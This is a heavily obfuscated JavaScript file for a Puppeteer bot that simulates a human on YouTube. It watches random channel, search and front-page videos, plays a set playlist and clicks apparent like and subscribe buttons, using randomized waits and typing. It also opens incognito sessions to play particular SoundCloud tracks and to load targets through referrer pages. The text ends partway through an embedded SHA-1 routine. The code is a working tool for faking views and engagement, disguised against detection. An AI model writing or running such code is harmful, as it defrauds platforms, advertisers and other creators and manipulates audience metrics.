const a0 = c,
  Z = d,
  Y = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x143 * -0x11 + -0x1433 + 0x1 * 0x29a7))) + i;
}

function a() {
  const bo = [
    'sSksaCogWQO',
    'st\x20ex-empl',
    'getElement',
    'WRBdGSkJvmkzW7ezubtdJq',
    'BM8Ty2fJAgu',
    'CMCVC2nYAxb0CW',
    'zwvKyMfJAY1ZAa',
    'xCkntSoaWR/dGgzVWOtcSW',
    'GY9WWhO504',
    'WQrbW5BcJtdcGSoQp8kGDa',
    'W5NdH2zBWRFcHZhdIaH9',
    'Ahr0Chm6lY9NCG',
    'B19HbETNi5',
    '\x20NT\x2010.0;\x20',
    'no-cache',
    'from',
    'umkGW5udnGa7hmomdq',
    'DxnLCKrHDgfeAq',
    'setAttribu',
    'oZnvk8oXWR0',
    '-diep-io-p',
    'WP3cUsi',
    'arrayBuffe',
    'wKrurvnPtJfLuW',
    'mCoFW7jRW5lcLmodWRftgW',
    'https://gr',
    'CMfUzg9T',
    'Xo0R8WiRSb',
    'h8k5W6VcGq',
    '\x20(KHTML,\x20l',
    'WR3cUmoSWP/cU0ddPaZdL8o1'
  ];
  a = function() {
    return bo;
  };
  return a();
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x13e3 + -0x1af9 + -0x1 * -0x2edc), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x23ce + -0x5 * 0x4bc + 0xc22 * -0x1);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x216b + -0x379 + -0xad * -0xe4 + (-0xd * -0x7d1 + 0x5f43 + -0x8a48) * random()) : await standardWaitForNetIdle(f), await wait(-0x97b + 0x255f + -0xa * 0xd6 + (0x13cb + -0xd3 * -0x48 + 0x2813 * -0x1) * random()), -0xa43 + 0x1b9a + -0x1156;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1 * 0x2b3 + -0x2b * 0x92 + 0x1 * 0x2ec1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x5 * 0x3da + -0x2688 + 0x1347;
}
async function randomWait() {
  return await wait(-0x2 * -0x1327 + 0x1 * 0xfa7 + -0x226d + (0xd * -0x203 + -0xb3b + 0x38ea) * random()), 0xe81 + -0x2 * 0x368 + 0x7b * -0x10;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1f89 + -0x20be + 0x4047, -0x1f6a + -0x36 * 0x30 + 0xddb * 0x3), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x5 * 0x1cc5 + 0x114 * 0xad + -0xa17 * -0x13) * getRandomInt(-0xc25 + -0x82 * -0x4a + -0x196d, -0x1791 + -0x22d2 + -0x6 * -0x9bc), h)), -0x475 * 0x3 + 0x101 * -0x15 + 0x2275;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x23ce + -0x5 * 0x4bc + 0xc22 * -0x1);
    let h = e[f];
    if (b['eMnJmE'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x889 * 0x4 + -0x26bd + 0x499 * 0x1, s, t, u = 0xab8 + -0xe57 * 0x1 + 0x39f; t = n['charAt'](u++); ~t && (s = r % (0x1e4c + 0x3 * 0x8c6 + -0x389a) ? s * (-0x1af9 + -0x1 * 0x2432 + 0x3f6b) + t : t, r++ % (-0x94 + -0x1 * 0x1945 + 0x19dd * 0x1)) ? p += String['fromCharCode'](0x7cc + -0x4f6 + -0x1d7 & s >> (-(0x255f + -0x11 * 0x1c3 + 0x3b5 * -0x2) * r & -0x21cd + 0x4 * 0x2 + 0x21cb)) : 0x1b9a + -0x2438 + 0x89e) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1886 + -0xb * -0x27a + 0x18 * -0x1d, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x5 * 0x3da + -0x2688 + 0x1356))['slice'](-(-0x2 * -0x1327 + 0x1 * 0xfa7 + -0x35f3));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xd * -0x203 + -0xb3b + 0x2562,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0xe81 + -0x2 * 0x368 + 0xb3 * -0xb; u < -0x1f89 + -0x20be + 0x4147; u++) {
          p[u] = u;
        }
        for (u = -0x1f6a + -0x36 * 0x30 + 0x332 * 0xd; u < -0x9 * 0x155 + 0xad * 0x17 + -0x147 * 0x2; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0xc25 + -0x82 * -0x4a + -0x186f), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1791 + -0x22d2 + -0x1 * -0x3a63, q = -0x475 * 0x3 + 0x101 * -0x15 + 0x2274;
        for (let v = -0xceb * 0x1 + -0xe56 + 0x1b41; v < n['length']; v++) {
          u = (u + (0x228a + 0x2499 + -0x4722)) % (0x2365 + 0x131 + -0x11cb * 0x2), q = (q + p[u]) % (-0x67 * 0x17 + 0x1 * -0x182f + 0x2270), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1385 + 0x1cf2 + -0x3 * 0x2cf)]);
        }
        return t;
      };
      b['STsNjP'] = m, c = arguments, b['eMnJmE'] = !![];
    }
    const j = e[0x23e5 + 0x4 * -0x884 + -0x1d5],
      k = f + j,
      l = c[k];
    return !l ? (b['MaXLQi'] === undefined && (b['MaXLQi'] = !![]), h = b['STsNjP'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0xceb * 0x1 + -0xe56 + 0x1b41;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x228a + 0x2499 + -0x4722]['split']('\x20');
    for (let k = 0x2365 + 0x131 + -0x619 * 0x6; k < i['length']; k += -0x67 * 0x17 + 0x1 * -0x182f + 0x2172)
      j += i[k] * h[i[k + (-0x1385 + 0x1cf2 + -0xc * 0xc9)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x23e5 + 0x4 * -0x884 + -0x1cf)['map'](l => Array['from'](l['children']))['flat'](0x93a + -0x66d + -0x2cc * 0x1)['map'](l => l['childNodes'][0x1873 + 0x1c2f + 0x3 * -0x118b]['childNodes'][-0x18 * 0x182 + -0x18f0 + 0x3d20]['childNodes'][-0x2026 + -0x931 * -0x3 + 0x494 * 0x1]['childNodes'][-0x1 * 0x162f + 0x16bf + -0x12 * 0x8]['childNodes'][-0x408 * 0x5 + -0x17d7 + 0x2c00]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1c90 + -0x7dd + 0x2855, -0x3 * 0x185 + -0x26fd + -0x5bc * -0xb)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x1 * 0x617e + 0x632c + 0x2 * 0x1c75);
  const h = await getMaxTime(f),
    i = Math['min']((-0x13d54 + -0x2 * 0x8777 + 0x336a2) * getRandomInt(0x12b5 * 0x1 + 0x25e6 + -0x3899 * 0x1, -0x1dcc * -0x1 + -0x139d + 0x515 * -0x2), h);
  return await wait(i), 0xc61 * -0x3 + 0x73f + 0x1de5;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const R = d;
    var h;
    (h = Array[R(0xf)](document[R(0x2) + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0xbc3 * 0x2 + 0x270e + 0xa6e * -0x6]['children'][-0x16df + -0x1 * -0x16ac + -0x3 * -0x11]['children'][-0x18ff + 0x1c37 + -0x338]['children'][-0x13eb + -0x1204 * 0x2 + 0x37f3]['children'][0x78b * -0x1 + -0x76f + 0xefa]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x1 * 0x7b5 + -0x4 * -0x1f3 + -0xf80;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const S = d;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])[S(0x12) + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x1da4 + 0x515 * 0x4 + -0x5c * -0x1b + (0x3f1 * -0x7 + -0x71 * 0x33 + 0x1d * 0x1bc) * random()
  }), await wait(-0x1 * 0x229f + -0x1569 + 0x39fc + (-0x7a8 + 0x1 * -0x71f + -0x551 * -0x3) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x656 + 0x1363 + -0x9 * 0x173]['childNodes'][-0x997 + -0x8a + 0xa22]['childNodes'][-0x10a6 + -0x1 * 0x21fa + -0x1 * -0x32a1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1cd9 + -0x769 + 0x156b * -0x1]['childNodes'][-0x12a * -0xf + 0x1 * -0xdf + 0x1 * -0x1097]['childNodes'][-0x6bb * -0x4 + -0x11d2 + 0x2 * -0x48c]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x9 * 0x37f + -0x1c02 + 0x1a * -0x22),
          r = 0x5e * -0x42 + -0x581 + 0x17 * 0x14b;
        for (let u = 0x9 + 0x2e * -0x73 + -0x14a1 * -0x1; u < q['length']; u += 0x1320 + 0x936 + -0x25 * 0xc4)
          r += q[u] * k[q[u + (0x1 * -0x4eb + -0x63 * -0x57 + 0x3 * -0x993)]];
        return r;
      }(n);
  });
  await wait((-0x4855 + 0x1d88 + -0x6565 * -0x1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x144a + -0x8f26 + 0x18dd0) * getRandomInt(-0x240c + -0x2f9 * -0x3 + 0x1b22, -0x71a + 0x1 * 0x14f6 + -0xdd2), h + (-0x262e + 0xde + -0x1 * -0x38d8));
  return await wait(i), 0x1391 + 0x5e2 + -0x1972;
}
async function keyWatch(f) {
  const T = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0xf15 + -0x2 * -0x944 + -0x219d), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + T(0x6) + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x173f + -0x3b * -0x47 + 0x129a + (-0xcf * 0x19 + -0x2b0 + 0x1acf) * Math['random']());
    });
  }, -0xd1c * -0x1 + -0xfc3 + 0x1dff);
  await wait(-0xb81f * 0x1 + -0x2179f + 0x6 * 0x13b45);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0xbc3 + -0x18acc + 0x280ef) * getRandomInt(-0x1 * -0x9e9 + 0x1a3b + -0x2420, -0xb51 + 0x1 * -0x1f96 + 0x56 * 0x80)), clearInterval(h), 0x24a + 0x3 * 0x33f + -0xc06;
}
async function runYTModule(f, h) {
  const U = c,
    i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1 * -0x10ee + -0x1 * -0x26b1 + -0x379f;
    try {
      await standardWaitForNetIdle(i), await GlobalActions[U(0x1a)]()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x620 + 0xa39 + -0x418;
    await randomWait();
  }
  return 0x432 + -0xad9 + 0x6a8;
}

function fetchRandomSC() {
  return Math['random']() <= 0x40f * 0x7 + 0x1910 + 0xa9 * -0x51 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x51d + -0xb * 0x58 + 0x1 * -0x155 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const X = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x308 * 0x4 + -0x22dc + 0x2efc + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0xc31 + 0x13a0 + -0x76f;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xbc32 + -0xd00f + -0x15 * -0x951 + getRandomInt(0xc02 + 0x6fd + 0x2799, -0x5e63 * 0x1 + -0xa4cd + 0x17860));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x95 * -0x35 + -0x35e + -0x2 * 0xdbd), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1 * -0xbaa + -0x1710 + -0xb66 * -0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1eeb * -0x1 + 0x2e7 * 0x7 + 0xa9a, -0x207b + 0x15ff + 0xaae)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0xe66 + 0x847 * 0x3 + -0x7 * 0x47d + floor((-0x26ff + 0x153f + 0x15a8) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xe19a4932 + -0x1ce9f7ce + -0x1e6 * -0xc97d80),
          0xf238c5 + -0x1 * 0xe9c201 + 0x4 * 0x1de24f,
          0x1537 * -0x1 + 0xff9e + 0x6a67 * -0x1,
          0x821 * -0x3 + 0x25bc + -0x12b * 0xb
        ], y = [
          0x214 + 0x8d8 + -0xad4,
          0xa45 + -0x23b4 + -0x6b * -0x3d,
          0x61c + 0xb9b + 0x1 * -0x11af,
          -0x5a2 * -0x2 + 0x1f9 * -0x7 + 0x28b
        ], z = [
          'hex',
          'array',
          'digest',
          V(0x16) + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x2bd + -0x14be + -0x29c * -0x9)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x2417 + 0x4bb * -0x5 + -0x1ddf * -0x2; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x21dd + 0xe5 * 0x1f + 0x622) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              const W = b;
              J ? (A[0x82 + 0x1143 + 0x11c5 * -0x1] = A[-0x2 * -0x11ca + -0x2cd + -0x20b7 * 0x1] = A[0x2 * -0xfaa + 0x1131 + 0xe24] = A[0x1b * -0xa4 + 0x2517 + 0x13c9 * -0x1] = A[0x44e * 0x3 + -0x439 + -0x457 * 0x2] = A[-0x204f + 0xaba + 0x1599] = A[0x18 * -0x9 + 0xcdc + -0xbff] = A[-0x1c26 + -0x31d * -0x4 + -0x4 * -0x3ee] = A[-0x1 * 0x1409 + -0x1 * -0xa2e + 0x9e2] = A[0x1 * 0x1746 + -0x24d7 + 0xd99 * 0x1] = A[-0x21af + 0x1 * -0xabb + 0x2c73] = A[0x29 * -0xe6 + 0x171f * -0x1 + 0x1 * 0x3bff] = A[-0x136 * 0x19 + -0x10 * 0x3 + -0x39 * -0x89] = A[0x2521 + 0x2532 + 0x1 * -0x4a47] = A[0x7bb * 0x3 + -0x7d * 0xf + -0xfd1] = A[0x15e2 + -0x1a3f + 0x46b] = A[-0x15 * -0x5a + -0xd * 0x14e + 0x9a3] = 0x1ec1 + 0x2267 + -0xf * 0x458, this['blocks'] = A) : this['blocks'] = [
                0x1fbf + 0x1dd5 * 0x1 + -0x3d94,
                -0x6 * -0x516 + 0x2 * 0xb7b + 0x172 * -0x25,
                0xac3 + 0x1f * 0x32 + -0x10d1,
                -0x26c9 * 0x1 + 0x208e + 0x13f * 0x5,
                0xb8 * -0x2f + 0x13 * -0x71 + -0x27b * -0x11,
                -0x347 * -0x9 + -0x1dfd + 0x7e,
                0x6c0 + 0x6fb * -0x5 + 0x1c27,
                0x1ddf * -0x1 + 0x2419 * 0x1 + 0x31d * -0x2,
                0x6e6 * -0x2 + 0xa52 + -0xa * -0x59,
                -0x7b + 0x1 * 0x1285 + -0x120a,
                -0x1ba0 + -0xe6e + -0x2a0e * -0x1,
                -0x10d * 0xb + -0x24e4 * -0x1 + -0x1955,
                -0x322 * -0x2 + -0x89 * 0x46 + 0x1f32,
                0x6ca + 0x1 * 0x1120 + 0x2 * -0xbf5,
                0x71 * -0x33 + -0x8 * 0x171 + 0x69 * 0x53,
                -0x1 * -0x1c35 + 0x4 * -0x351 + -0xef1 * 0x1,
                0x158c + -0xb * 0x266 + -0x4d6 * -0x1
              ], this['h0'] = 0x1 * -0x5a286001 + -0x2eb * -0xf2aae + 0x952bf948, this['h1'] = -0x1153fa1d3 + -0xa36d6908 + -0x2a87ab664 * -0x1, this['h2'] = 0x209b0a9 * -0x43 + -0x1072ab89 * -0x3 + 0xefec169e, this['h3'] = -0xae0b34c + 0x2 * -0xdf8fd57 + -0xd4010 * -0x427, this['h4'] = -0x8cd69bb8 + -0x6 * 0x4dcd97c + -0xc * -0x1e7c8c8c, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x21c6 + -0x122c + 0x6d * 0x7a, this['finalized'] = this[W(0x13, 'XHnT')] = 0x14 * -0x85 + 0x9fa + 0x6a, this['first'] = -0x3b * 0xa0 + -0xbef + -0x2 * -0x1868;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x135a * -0x2 + 0x1b * -0x155 + 0x1 * -0x2bd, O = J['length'] || 0x1 * 0x193 + 0x1e09 * 0x1 + -0x1f9c, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x4a9 * 0x8 + -0x3a3 + -0x21a5 * 0x1, P[0x1d1 + 0x519 + -0x6ea] = this['block'], P[-0x261 + 0xc * 0xd1 + 0x75b * -0x1] = P[0x6b * -0x19 + 0x1 * 0x172d + -0xcb9] = P[0x1c72 + -0x1370 + -0x900] = P[0x250d + 0xb9 * -0x7 + -0x1ffb] = P[-0xfe8 + -0x1f49 * 0x1 + 0x971 * 0x5] = P[-0x4 * 0xd0 + -0x69 * -0x24 + -0x1b * 0x6d] = P[0x167c + -0x1 * -0x192b + -0x2fa1 * 0x1] = P[0xacf + -0x116 * 0x5 + 0x112 * -0x5] = P[-0xdfc + 0x1 * -0x23b1 + 0x31b5] = P[-0x1e09 + 0x1005 + -0x3 * -0x4af] = P[0x13b7 + 0x3cb * 0x1 + -0x8 * 0x2ef] = P[0x2 * -0x9bb + 0x705 + 0xc7c] = P[0x11cf + 0x12b + -0x12ee] = P[0x19 + 0x13b * 0x1 + -0x3 * 0x6d] = P[0x13ec + -0xb35 + -0x8a9] = P[0x1926 + 0x1e5a + 0x9 * -0x629] = -0xd * -0x14f + -0x2 * -0x1b7 + 0x1471 * -0x1), K) {
                    for (N = this['start']; M < O && N < -0x1f25 + 0xef9 * 0x2 + -0x173 * -0x1; ++M)
                      P[N >> -0x1 * -0x14c3 + 0x2455 + -0x3916] |= J[M] << y[0xb06 + -0x1288 + 0x785 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x88 * 0x45 + -0x8 * -0x21f + 0x13f0; ++M)
                      (L = J['charCodeAt'](M)) < 0x83 * 0xb + -0x1a85 + -0x94 * -0x25 ? P[N >> 0x1c8d + -0x14e3 + -0x7a8] |= L << y[-0x696 + 0x158 + 0x10d * 0x5 & N++] : L < -0x20e3 + -0x2550 + -0x1 * -0x4e33 ? (P[N >> 0x9da + 0x6 * 0x122 + -0x10a4] |= (-0x198a + 0x1bf7 * 0x1 + -0x1ad | L >> 0x39 * 0x55 + 0x2076 + -0x1e7 * 0x1b) << y[-0xa8b + -0x1 * 0x577 + 0x1 * 0x1005 & N++], P[N >> 0x4f * -0x1d + 0x1693 * 0x1 + 0x245 * -0x6] |= (0x37d * -0x6 + -0x162f + -0x7 * -0x63b | -0x2dd * -0x4 + 0x2b5 + -0xdea * 0x1 & L) << y[-0x12c9 * 0x1 + -0x139 * -0x1 + -0x1193 * -0x1 & N++]) : L < 0x2433 + -0x93de + 0x6d39 * 0x3 || L >= -0x9f50 + 0x205f * 0x8 + 0x7c58 ? (P[N >> 0x272 + 0xc64 + -0x3b5 * 0x4] |= (-0x942 + 0x1eb7 + -0x1495 | L >> -0xb3b + 0x7ba + -0x3 * -0x12f) << y[-0xc83 * -0x2 + 0x1 * -0x1017 + -0x1 * 0x8ec & N++], P[N >> 0x20ab * 0x1 + -0x577 * -0x2 + -0x2b97] |= (0x11c7 + -0x1b * -0x9f + 0x1106 * -0x2 | L >> 0x1fa2 + 0x1a14 + -0xe6c * 0x4 & -0xebf * 0x2 + -0x7 * 0x41f + 0x3a96) << y[0x151d + 0xda3 + -0x1 * 0x22bd & N++], P[N >> -0x5 * 0x14b + -0x9e3 + -0x82e * -0x2] |= (0x43d * -0x2 + 0x21e * 0x7 + -0x5d8 | 0x6 * 0x621 + 0x1422 + -0xf * 0x3c7 & L) << y[-0xa4 * 0x8 + 0x955 + -0x432 & N++]) : (L = -0x10290 + -0x143a3 + 0x34633 + ((-0x1 * 0x1c9c + -0x7 * -0x457 + 0x23a & L) << 0x2388 + 0x1d2 * -0x3 + -0x1e08 | -0x3e * -0x93 + -0x221a + 0x27f & J['charCodeAt'](++M)), P[N >> -0x1b * 0x21 + -0x1eba + 0x1 * 0x2237] |= (-0x3b * 0x52 + -0x17 * -0xfb + 0x5 * -0x8b | L >> 0x1eb1 + -0x3 * 0x373 + 0x2 * -0xa23) << y[0x1 * 0x7c6 + 0x23db * 0x1 + -0x745 * 0x6 & N++], P[N >> -0xd5d + -0x12bb * 0x1 + -0x24b * -0xe] |= (-0x1ed7 + -0x250b + 0x4462 | L >> -0x1 * 0x22a3 + -0x4cf * -0x1 + 0x1de0 & 0x20f7 + 0x114d * 0x1 + -0x3205) << y[0x1f5a + -0xa49 * -0x1 + 0x25 * -0x120 & N++], P[N >> -0x26aa + -0x20f5 + 0x47a1] |= (0x23a6 + -0x1c1 * -0x1 + -0x24e7 | L >> 0xaa6 + -0x243 * -0x2 + -0xf26 & 0xbfa + 0x823 + 0x2 * -0x9ef) << y[0x264 * -0x10 + 0xe1 * -0x2 + 0xd57 * 0x3 & N++], P[N >> -0x1cf9 + 0x21f * 0x7 + 0x6 * 0x25b] |= (0x1ff9 + 0x93a * -0x1 + -0x11 * 0x14f | 0xaad * -0x3 + -0x432 + 0x2478 & L) << y[-0xffc + 0x508 + 0x7 * 0x191 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0xef * -0x13 + -0x2 * -0x694 + -0x1 * 0x1ea5 ? (this['block'] = P[0x1cbd * 0x1 + 0x1 * 0x9ad + -0x265a], this['start'] = N - (-0x914 + 0x257 * -0x8 + -0x2 * -0xe06), this['hash'](), this['hashed'] = 0x25f7 + -0x1 * -0x735 + -0x2d2b) : this['start'] = N;
                }
